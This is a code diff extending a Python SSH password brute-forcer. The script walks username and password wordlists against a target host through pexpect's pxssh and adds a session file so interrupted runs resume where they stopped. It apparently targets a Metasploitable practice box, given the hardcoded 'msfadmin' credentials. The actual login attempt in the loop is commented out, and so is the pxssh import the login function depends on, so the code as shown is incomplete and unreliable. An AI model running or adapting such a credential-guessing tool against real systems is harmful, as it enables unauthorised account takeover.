@@ -2,7 +2,50 @@
 
 import sys, pexpect, argparse, os.path
 from os import path
-from pexpect import pxssh
+import itertools
+#from pexpect import pxssh
+
+def check_session():
+    try:
+        session = open(".session", "r")
+        session.close()
+        return True
+    except:
+        return False
+		
+def create_session():
+    try:
+        session = open(".session", "w")
+        session.close()
+        return True
+    except:
+        return False
+		
+def store_session(index1, index2):
+    try:
+        session = open(".session", "w")
+        session.write(str(index1) + ":" + str(index2))
+        session.close()
+        return True
+    except:
+        return False
+
+def restore_session():
+    try:
+        session = open(".session", "r")
+        line = session.readline().strip().split(":")
+        return int(line[0]), int(line[1])
+    except Exception as e:
+        return False
+
+def reset_session():
+    try:
+        session = open(".session", "w")
+        session.write("0:0")
+        session.close()
+        return True
+    except:
+        return False
 
 def ssh_connect(host, usr, pwd):
     try:
@@ -10,21 +53,30 @@ def ssh_connect(host, usr, pwd):
         s.login(host, usr, pwd)
         s.sendline('uptime')
         s.prompt()
-        print(s.before)
+        #print(s.before)
         s.logout()
+        return 0
     except Exception as e:
-        print(e)
-
+        err = str(e)
+        if "password refused" in err:
+            return 1
+        elif "establish connection" in err:
+            return 2
+        else:
+            return 3
+        
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--host", help="The host you want to scan", type=str, required=True)
     parser.add_argument("--usr", help="The wordlist path containing usernames", type=str, required=True)
     parser.add_argument("--pwd", help="The wordlist path containing passwords", type=str, required=True)
+    parser.add_argument("--rst", help="Flag to reset your session file", action="store_true", required=False)
     
     args = parser.parse_args()
     host = args.host
     usr = args.usr
     pwd = args.pwd
+    rst = args.rst
 
     if not path.exists(usr):
         print("Username file path does not exist.")
@@ -41,23 +93,50 @@ def main():
     if not path.isfile(pwd):
         print("Password file specified is not valid.")
         sys.exit(3)
+        
+    if rst:
+        reset_session()
+    
+    pos_usr = 1
+    pos_pwd = 1
+    idx_usr = 0
+    idx_pwd = 0
+    if not check_session():
+        if not create_session():
+            print("Failed to create new session.")
+            sys.exit(4)
+    else:
+        if not rst:
+            print("Restoring last session.")
+            pos_usr, pos_pwd = restore_session()
 
-    try:
-        usr_file = open(usr, 'r')
-    except:
-        print("Could not open username file.")
-        sys.exit(4)
+    u_f = open(usr, "r")
+    p_f = open(pwd, "r")
 
-    try:
-        pwd_file = open(pwd, 'r')
-    except:
-        print("Could not open password file.")
-        sys.exit(4)
+    for u in u_f:
+        idx_usr += 1
+        if idx_usr < pos_usr:
+            continue
+        else:
+            pos_usr = 0
+        for p in p_f:
+            idx_pwd += 1
+            if idx_pwd < pos_pwd:
+                continue
+            else:
+                pos_pwd = 0
+            # This is where the attempt is being made
+            print("Trying: ", u.strip() + ":" + p.strip())
+            #print(ssh_connect(host, "msfadmin", "msfadmin1"))
+            if not store_session(idx_usr, idx_pwd):
+                print("Could not save current session.")
+                sys.exit(4)
 
-    usr_file.close()
-    pwd_file.close()
+        p_f.seek(0)
+        idx_pwd = 0
 
-    print(ssh_connect(host, "msfadmin", "msfadmin"))
+    u_f.close()
+    p_f.close()
 
 if __name__ == "__main__":
     try:
